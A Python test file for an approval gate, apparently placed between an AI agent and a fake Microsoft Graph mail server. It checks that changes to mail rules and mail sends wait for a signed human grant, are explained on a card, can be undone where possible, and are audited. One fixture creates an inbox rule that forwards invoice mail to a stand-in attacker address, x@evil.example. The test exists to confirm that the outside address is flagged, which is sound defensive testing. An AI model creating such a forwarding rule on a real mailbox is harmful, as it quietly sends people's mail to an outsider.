"""The Graph adapter: Microsoft 365 objects behind the gate. A fake Graph
MCP server with the reference tool names; mail rules created, updated,
deleted and undone; a send that cannot be undone; an outside address
called out on the card."""

import json
import sys
from datetime import datetime, timedelta, timezone

from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
from fastapi.testclient import TestClient

from gargoyle.adapters import GraphAdapter, REF_REVERT_IRREVERSIBLE, adapter_from_name
from gargoyle.approval import build_grant, sign_grant
from gargoyle.issuer_service import build_issuer_app
from gargoyle.jws import encode
from gargoyle.mcp_server import EXECUTED_META_KEY, REASON_META_KEY, IssuerClient, ServerState, handle_message
from gargoyle.policy import ELIGIBLE, Decision
from gargoyle.revert import REF_REVERT_STATE_CHANGED, REVERT_TOOL
from gargoyle.state import state_sha256

issuer, executor, approver, idp = (Ed25519PrivateKey.generate() for _ in range(4))
PIN = {"policy_id": "p/1", "policy_sha256": "a" * 64}
TARGET = "mcp://graph"
PRINCIPAL = "agent@contoso.com"


class FakeGraph:
    """An in-process MCP server with the reference Graph tool names."""

    def __init__(self):
        self.rules = {"r1": {"id": "r1", "displayName": "Receipts", "sequence": 1, "isEnabled": True,
                             "conditions": {"subjectContains": ["receipt"]}, "actions": {"moveToFolder": "Receipts"}}}
        self.sent = []; self.n = 0

    def _ok(self, msg, obj):
        return {"jsonrpc": "2.0", "id": msg["id"], "result": {"content": [{"type": "text", "text": json.dumps(obj)}]}}

    def send(self, msg):
        if "id" not in msg:
            return None
        if msg["method"] == "initialize":
            return {"jsonrpc": "2.0", "id": msg["id"], "result": {"protocolVersion": "2025-06-18", "capabilities": {"tools": {}}, "serverInfo": {"name": "fake-graph", "version": "1"}}}
        if msg["method"] == "tools/list":
            return {"jsonrpc": "2.0", "id": msg["id"], "result": {"tools": [{"name": n} for n in ("list_mail_rules", "get_mail_rule", "create_mail_rule", "update_mail_rule", "delete_mail_rule", "send_mail")]}}
        name, args = msg["params"]["name"], msg["params"].get("arguments") or {}
        if name == "list_mail_rules":
            return self._ok(msg, {"value": list(self.rules.values())})
        if name == "get_mail_rule":
            r = self.rules.get(args["id"])
            return self._ok(msg, r) if r else {"jsonrpc": "2.0", "id": msg["id"], "result": {"isError": True, "content": [{"type": "text", "text": "not found"}]}}
        if name == "create_mail_rule":
            self.n += 1; rid = "r%d" % (self.n + 1); self.rules[rid] = {"id": rid, **args["rule"]}
            return self._ok(msg, self.rules[rid])
        if name == "update_mail_rule":
            self.rules[args["id"]].update(args["rule"]); return self._ok(msg, self.rules[args["id"]])
        if name == "delete_mail_rule":
            self.rules.pop(args["id"], None); return self._ok(msg, {})
        if name == "send_mail":
            self.sent.append(args); return self._ok(msg, {"sent": True})
        return {"jsonrpc": "2.0", "id": msg["id"], "error": {"code": -32601, "message": "no such tool"}}

    def close(self): pass


def token():
    return encode({"sub": PRINCIPAL, "exp": int((datetime.now(timezone.utc) + timedelta(hours=1)).timestamp())}, idp, "idp-1")


class MailPolicy:
    def pin(self): return PIN
    def decide(self, target_url, interaction):
        t = interaction.get("tool")
        return Decision(ELIGIBLE, None, True) if t in ("create_mail_rule", "update_mail_rule", "delete_mail_rule", "send_mail") else Decision(ELIGIBLE)


def _rig(tmp_path, graph):
    app = build_issuer_app(policy=MailPolicy(), signing_key=issuer, key_id="issuer-1", idp_public_keys={"idp-1": idp.public_key()},
                           approver_public_keys={"approver-1": approver.public_key()})
    c = TestClient(app); h = {"Authorization": "Bearer " + token()}; cards = []

    class Shim:
        def post(self, url, json=None, headers=None, timeout=None): return c.post(url.replace("http://i", ""), json=json, headers=headers)
        def get(self, url, headers=None, timeout=None): return c.get(url.replace("http://i", ""), headers=headers)

    def human(seconds):
        for hold in c.get("/pending", headers=h).json()["pending"]:
            cards.append(hold); env = hold["envelope"]
            g = sign_grant(build_grant(decision_sha256=env["decision_sha256"], approval_request_id=env["approval_request_id"],
                                       grant_id="g-" + env["approval_request_id"], not_after=datetime.now(timezone.utc) + timedelta(minutes=5)), approver, "approver-1")
            c.post("/grants", json=g, headers=h)
    spec = json.loads(open("gargoyle/specs/graph-reference.json").read()); spec["internal_domains"] = ["contoso.com"]
    adapter = GraphAdapter(graph, spec)
    state = ServerState({"pinned_public_keys": {"issuer-1": issuer.public_key()}, "record": PIN, "target_id": TARGET, "principal": PRINCIPAL,
                         "approver_public_keys": {"approver-1": approver.public_key()}, "executor_signing_key": executor, "executor_key_id": "executor-1"},
                        upstream=graph, issuer_client=IssuerClient("http://i", token(), http=Shim(), approval_timeout=30, poll_seconds=0.01, sleep=human),
                        audit_log=str(tmp_path / "audit.jsonl"), state_probe=adapter)
    handle_message(state, {"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {"clientInfo": {"name": "ChatGPT", "version": "2"}}})
    handle_message(state, {"jsonrpc": "2.0", "method": "notifications/initialized"})
    return state, cards


def call(state, n, name, args):
    return handle_message(state, {"jsonrpc": "2.0", "id": n, "method": "tools/call", "params": {"name": name, "arguments": args}})["result"]


def test_probe_describes_rules_and_flags_outside_addresses():
    g = FakeGraph(); spec = json.loads(open("gargoyle/specs/graph-reference.json").read()); spec["internal_domains"] = ["contoso.com"]
    a = GraphAdapter(g, spec)
    desc, data = a.probe("create_mail_rule", {"rule": {"displayName": "Fwd invoices", "actions": {"forwardTo": [{"emailAddress": {"address": "x@evil.example"}}]}}})
    assert desc["ref"] == "mailRule:all" and desc["summary"].startswith("creates inbox rule 'Fwd invoices'")
    assert "outside address: x@evil.example" in desc["summary"] and "1 inbox rule(s) exist now" in desc["summary"]
    assert json.loads(data)[0]["id"] == "r1" and state_sha256(desc) == state_sha256({"ref": desc["ref"], "sha256": desc["sha256"], "size": desc["size"]})
    desc, data = a.probe("update_mail_rule", {"id": "r1", "rule": {"isEnabled": False}})
    assert desc["ref"] == "mailRule:r1" and desc["summary"] == "updates inbox rule 'Receipts'" and json.loads(data)["id"] == "r1"
    desc, data = a.probe("delete_mail_rule", {"id": "nope"})
    assert desc["sha256"] is None and "does not exist now" in desc["summary"]
    desc, data = a.probe("send_mail", {"to": "bob@partner.example", "subject": "Q3 numbers"})
    assert desc["irreversible"] is True and data is None and "Cannot be undone" in desc["summary"] and "outside address" in desc["summary"]
    assert a.probe("read_mail", {}) is None
    assert adapter_from_name("graph", g).name == "graph"


def test_rule_create_is_held_explained_and_undone_by_deleting_it(tmp_path):
    g = FakeGraph(); state, cards = _rig(tmp_path, g)
    r = call(state, 2, "create_mail_rule", {"rule": {"displayName": "Fwd invoices", "sequence": 2, "isEnabled": True,
                                                     "conditions": {"subjectContains": ["invoice"]}, "actions": {"forwardTo": [{"emailAddress": {"address": "x@evil.example"}}]}}})
    assert r["_meta"][EXECUTED_META_KEY] is True and len(g.rules) == 2
    assert "outside address: x@evil.example" in cards[-1]["state"]["summary"]          # the approver was told
    assert "pre_state_sha256" in r["_meta"]["gargoyle/execution"] and "post_state_sha256" in r["_meta"]["gargoyle/execution"]
    # Undo: the created rule is deleted, held like any other change.
    r = call(state, 3, REVERT_TOOL, {"decision_id": "last"})
    assert r["_meta"][EXECUTED_META_KEY] is True, r
    assert set(g.rules) == {"r1"} and cards[-1]["envelope"]["request_context"]["tool"] == "delete_mail_rule"
    assert cards[-1]["state"]["summary"] == "deletes inbox rule 'Fwd invoices'"


def test_rule_update_and_delete_are_undone_by_the_inverse_call(tmp_path):
    g = FakeGraph(); state, cards = _rig(tmp_path, g)
    assert call(state, 2, "update_mail_rule", {"id": "r1", "rule": {"isEnabled": False}})["_meta"][EXECUTED_META_KEY]
    assert g.rules["r1"]["isEnabled"] is False
    r = call(state, 3, REVERT_TOOL, {"decision_id": "last"})
    assert r["_meta"][EXECUTED_META_KEY] and g.rules["r1"]["isEnabled"] is True and cards[-1]["envelope"]["request_context"]["tool"] == "update_mail_rule"
    assert call(state, 4, "delete_mail_rule", {"id": "r1"})["_meta"][EXECUTED_META_KEY] and "r1" not in g.rules
    r = call(state, 5, REVERT_TOOL, {"decision_id": "last"})
    assert r["_meta"][EXECUTED_META_KEY] and cards[-1]["envelope"]["request_context"]["tool"] == "create_mail_rule"
    restored = [x for x in g.rules.values() if x["displayName"] == "Receipts"]
    assert len(restored) == 1 and restored[0]["conditions"] == {"subjectContains": ["receipt"]}
    # Changed since: someone else edited the mailbox after the gate's write; the undo is refused before any card.
    assert call(state, 6, "update_mail_rule", {"id": restored[0]["id"], "rule": {"sequence": 9}})["_meta"][EXECUTED_META_KEY]
    g.rules[restored[0]["id"]]["displayName"] = "edited elsewhere"
    r = call(state, 7, REVERT_TOOL, {"decision_id": "last"})
    assert r["isError"] and r["_meta"][REASON_META_KEY] == REF_REVERT_STATE_CHANGED


def test_send_mail_is_held_and_cannot_be_undone(tmp_path):
    g = FakeGraph(); state, cards = _rig(tmp_path, g)
    r = call(state, 2, "send_mail", {"to": "bob@partner.example", "subject": "Q3 numbers", "body": "attached"})
    assert r["_meta"][EXECUTED_META_KEY] and g.sent == [{"to": "bob@partner.example", "subject": "Q3 numbers", "body": "attached"}]
    assert cards[-1]["state"]["irreversible"] is True and "Q3 numbers" in cards[-1]["state"]["summary"]
    r = call(state, 3, REVERT_TOOL, {"decision_id": "last"})
    assert r["isError"] and r["_meta"][REASON_META_KEY] == REF_REVERT_IRREVERSIBLE
    # Evidence names the client and the person, as everywhere else.
    lines = [json.loads(l) for l in (tmp_path / "audit.jsonl").read_text(encoding="utf-8").splitlines()]
    assert lines[0]["client"] == "ChatGPT 2" and lines[0]["principal"] == PRINCIPAL and lines[0]["tool"] == "send_mail"
